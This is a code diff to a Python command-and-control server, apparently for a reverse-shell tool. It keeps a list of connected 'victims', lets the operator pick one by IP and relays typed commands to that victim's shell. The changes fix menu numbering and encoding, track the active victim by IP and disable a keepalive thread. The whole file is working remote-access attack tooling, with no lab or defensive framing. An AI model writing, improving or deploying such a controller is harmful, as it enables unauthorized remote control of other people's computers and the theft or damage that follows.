@@ -1,10 +1,11 @@
 import socket
 from threading import Thread
 import sys
+import time
 
 victims_sockets = []
 victims_connections_log = []
-current_socket = None
+current_victim = None
 
 
 class Cli:
@@ -24,7 +25,7 @@ class Cli:
         print("You can use commands below:")
 
         for n, c in zip(range(len(self.cli_commands)), [c[0] for c in self.cli_commands]):
-            print(f"({n}) {c}")
+            print(f"({n+1}) {c}")
         print("")
 
     def handle(self):
@@ -32,7 +33,7 @@ class Cli:
             self.__show_connections_log()
             try:
                 command_number = int(input("Enter commands number >>> "))
-                command_method = self.cli_commands[command_number][1]
+                command_method = self.cli_commands[command_number-1][1]
                 command_method()
             except Exception:
                 print("Wrong command!")
@@ -53,24 +54,24 @@ class Cli:
             print("There are no victims")
 
     def __connect_to_victim(self):
-        global current_socket
+        global current_victim
         victim_ip = input("Enter victims ip >>> ")
         v_socket = Server.get_socket_by_ip(victim_ip)
-        current_socket = v_socket
+        current_victim = v_socket.getpeername()[0]
         if v_socket:
             print(f"Successful connected to {victim_ip}")
-            v_socket.send("start shell".encode())
-            print(v_socket.recv(1024 * 4).decode(), end="")
+            v_socket.send("start shell".encode("utf-8"))
+            print(v_socket.recv(1024 * 4).decode("utf-8"), end="")
             while True:
                 command = input()
                 if command == "exit":
                     print("Exiting...")
                     break
-                v_socket.send(command.encode())
-                print(v_socket.recv(1024 * 1024).decode(), end="")
+                v_socket.send(command.encode("utf-8"))
+                print(v_socket.recv(1024 * 1024).decode("utf-8"), end="")
         else:
             print(f"IP {victim_ip} not founded")
-        current_socket = None
+        current_victim = None
 
     def __exit(self):
         global victims_sockets
@@ -97,9 +98,9 @@ class Server:
         t1.daemon = True
         t1.start()
 
-        t2 = Thread(target=self.check_available_victims, args=())
-        t2.daemon = True
-        t2.start()
+        # t2 = Thread(target=self.check_available_victims, args=())
+        # t2.daemon = True
+        # t2.start()
 
     def accepting_victims(self):
         global victims_sockets
@@ -110,16 +111,18 @@ class Server:
             victims_sockets.append(v_socket)
 
     def check_available_victims(self):
-        global victims_sockets, current_socket
+        global victims_sockets, current_victim
         while True:
             for v_socket in victims_sockets:
-                if v_socket == current_socket:
+                if v_socket.getpeername()[0] == current_victim:
                     continue
-                try:
-                    v_socket.send("hello".encode())
-                except:
-                    v_socket.close()
-                    victims_sockets.remove(v_socket)
+                else:
+                    try:
+                        v_socket.send("hello".encode())
+                    except:
+                        v_socket.close()
+                        victims_sockets.remove(v_socket)
+                time.sleep(1)
 
     @staticmethod
     def get_socket_by_ip(ip):
